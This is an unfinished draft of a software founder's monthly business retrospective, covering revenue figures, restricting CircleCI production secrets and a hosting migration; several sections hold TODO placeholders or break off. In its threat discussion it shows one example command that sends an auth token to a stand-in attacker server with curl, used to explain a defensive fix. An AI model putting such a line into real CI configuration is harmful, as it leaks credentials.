---
title: "TinyPilot: Month 45"
date: 2024-04-10T00:00:00-04:00
description: TODO - One-line summary
---

{{<notice type="info">}}

**New here?**

Hi, I'm Michael. I'm a software developer and the founder of [TinyPilot](https://tinypilotkvm.com), an independent computer hardware company. I started the company in 2020, and it now earns $80-100k/month in revenue and employs six other people.

Every month, I publish a retrospective like this one to share how things are going with my business and my professional life overall.
{{</notice>}}

## Highlights

-

## Goal Grades

At the start of each month, I declare what I'd like to accomplish. Here's how I did against those goals:

### Fill the gaps in TinyPilot's release documentation

- **Result**: XX
- **Grade**: XX

TODO

### Complete 2023 taxes

- **Result**: XX
- **Grade**: XX

TODO

## [TinyPilot](https://tinypilotkvm.com/?ref=mtlynch.io) stats

{{<revenue-graph project="tinypilot">}}

| Metric                   | February 2024  | March 2024    | Change                                          |
| ------------------------ | -------------- | ------------- | ----------------------------------------------- |
| Unique Visitors          | 13,000         | 9,100         | <font color="red">-3,900 (-30%)</font>          |
| Sales Revenue            | $82,517.42     | $107,809.83   | <font color="green">+$25,292.41 (+31%)</font>   |
| Enterprise Subscriptions | $290.70        | $290.70       | 0                                               |
| Royalties                | $3,373.65      | $2,442.12     | <font color="red">-$931.53 (-28%)</font>        |
| Total Revenue            | $86,181.77     | $110,542.65   | <font color="green">+$24,360.88 (+28%)</font>   |
| **Profit**               | **$23,599.09** | **$3,193.73** | **<font color="red">-$20,405.36 (-86%)</font>** |

March was TinyPilot's strongest month ever of sales revenue, narrowly beating [our previous record](/retrospectives/2022/12/#tinypilothttpstinypilotkvmcomrefmtlynchio-stats) by $600.

Visits are down from last month but only because last month had an atypical surge in visits.

## Tightening access to TinyPilot's production secrets

Over the past few months, we've been [improving TinyPilot's release process](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process) so that it's more automated and less dependent on me specifically.

In reviewing our release workflow, we realized that too many team members had access to production secrets. Production secrets include things like authentication tokens that allow our automated systems to publish new versions of our website or the TinyPilot application.

We're a small team, so in our case, "too many" was five people instead of just one. Still, four people had access to production secrets and didn't need them, so we wanted to lock things down further.

We never store secrets in source. Instead, our secrets are in our continuous integration (CI) system, CircleCI. CI is how we test and deploy our code after it hits our source repository.

Most TinyPilot repositories are "push on green," (TODO: link) meaning that we push every code change to production after it passes our automated tests on CI.

We store our secrets in CircleCI environment variables. This initially seemed fine because environment variables are write-only, meaning that you can't read the values after storing them in CircleCI.

{{<img src="ci-env-vars.webp" has-border="true" max-width="700px" caption="CircleCI's admin interface only shows a portion of the values of environment variables, and only the CircleCI admin can see them. Note that I'm showing synthetic values, as I don't even want to expose a portion of real auth tokens.">}}

Once we started thinking more critically about protecting secrets, we realized that despite what CircleCI's web UI suggested, everyone on the team effectively had access to our environment variables. A malicious team member with access to TinyPilot source code could extract secrets in one of two ways:

1. They could push a change to our CircleCI config file that exfiltrates a secret to a remote server they control like `curl http://attacker-server.example.com/exfiltrate?token=$AUTH_TOKEN`
1. They could publish an innocuous change, then SSH in to CircleCI and type `echo $AUTH_TOKEN` on the command line.

(1) was semi-possible to detect, but it wasn't something we ever checked. (2) was impossible to detect, as CircleCI doesn't log SSH sessions.

We looked into tightening access, and CircleCI's recommendation was to store security-sensitive secrets in "contexts." Contexts are still environment variables, but CircleCI lets you define more granular access to them.

The problem was that security contexts didn't work with push on green. Security contexts only allowed you restrict access to environment variables to a certain set of people. We wanted to preserve the workflow that all changes approval from at least one teammate, but any two team members could push a change to production.

With CircleCI security contexts, the only way to continue our workflow would be to create a security context that everyone on the team could access, but that brought us back to our original problem.

We reached out to CircleCI support, and they said they were coincidentally working on something that would solve our problem and would release it in a few weeks. Two weeks later, CircleCI released [expression-based context restrictions](https://circleci.com/changelog/expression-based-context-restrictions/), which did, in fact, perfectly solve our problem.

CircleCI's expression-based restrictions allowed us to add restrictions to contexts beyond just an allowlist of users with access. They enabled us to limit access to secrets to our main branch and when SSH is disabled:

```python
pipeline.git.branch == "master" and not job.ssh.enabled
```

It solves (1) above because a malicious team member who tries to exfiltrate a secret using a branch would not have access to the secret in that branch.

It solves (2) by just making the secret unavailable when a initiates a CircleCI job with SSH access.

This system is still vulnerable to two team members teaming up to do something malicious. One could introduce a code change that exfiltrates a secret, and their co-conspirator could approve it. But this would be a particularly "loud" attack, as anyone else on the team could observe malicious code in a file we frequently work on, and there'd be a clear audit trail of who put it there.

Overall, I'm happy with CircleCI's expression-based context restrictions. If you're on a team where CI has access to production secrets, I recommend you think about whether too many team members have access to secrets they don't need.

## Migrating services between hosts badly and then a little better

### The Firebase to Netlify migration

Moving from Firebase to Netlify

One other side-benefit of Netlify is that the config file is in YAML, which allows comments. Firebase's config file was in JSON, which does not allow comments. But comments are incredibly helpful for static site configuration. For example, we maintain a set of HTTP redirects through the configuration file, and it's extremely valuable to have comments explaining why a redirect is there and whether or not it needs to exist permanently.

I updated the DNS entries for `tinypilotkvm.com`, and everything worked. I tried visiting the site and: TLS error. Uh oh. That's bad. Nobody wants to shop on a site that's serving a TLS error.

Had Netlify not generated the TLS certificate yet? I checked the TLS error, and it turned out that my browser was complaining about a TLS certificate from Firebase. Huh? Wouldn't Firebase still be serving the old site with the old certificate?

My mental model of the visitors was that they'd fall in two buckets depending on how fresh the information was in their DNS server:

1. They query a DNS server that has the old Firebase address -> They see the old Firebase version working as it did before I updated DNS.
1. They query a DNS server that has the new Netlify address -> They see the new Netlify version working.

Even now, I don't understand why I was seeing a Firebase certificate error.

As a workaround, I configured Firebase to redirect visitors to `netlify-preview.tinypilotkvm.com`. That worked, so customers stopped seeing the TLS error. I wish I'd chosen a less weird staging domain than `netlify-preview` because it strongly suggests to customers that something is wonky, but it was better than a TLS error.

For a full day after, the old site was still receiving traffic, but after a few days, Firebase stopped receiving any traffic for `tinypilotkvm.com`.

### The AWS to Fly.io migration

When it came time to

### A general strategy

Move a service on example.com from platform A to platfrom B.

1. Deploy your service to platform B.
1. Set up a subdomain for your service pointing to platform B.
   - Choose a subdomain that won't weird out your customers too much if they see it like `www2.example.com` or `web.example.com` not `insecure-staging.example.com`.
1. Make sure you can visit platform B through your new subdomain with no TLS errors in your browser.
1. Reduce the TTL on root `example.com` DNS entries to something low like 1-5 minutes.
1. Generate a certificate for `example.com` on platform B.
   - This is usually under "add a custom domain" setting.

For the real migration:

1. Pick a time when traffic is low to your service and schedule the migration for that time.
   - If you might need support from your teammates, make sure they're available at this time.
1. Update DNS entries to point to platform B instead of platform A.

After a day:

1. Verify that traffic to platform B has stopped.
1. Restore your DNS entries TTL to something sensible like 60 minutes.

## Side projects

### Writing a simple compiler

It accepts code that's semantically incorrect like `PUSH1 RETURN`, but it's good enough for my purposes.

## Wrap up

### What got done?

- Published ["Why does an extraneous build step make my Zig app 10x faster?"](https://mtlynch.io/zig-extraneous-build/)
- Published ["Building My First Homelab Server Rack"](https://mtlynch.io/building-first-homelab-rack/).
- Completed delegation of our RMA process to a third-party vendor.

### Lessons learned

-

### Goals for next month

-
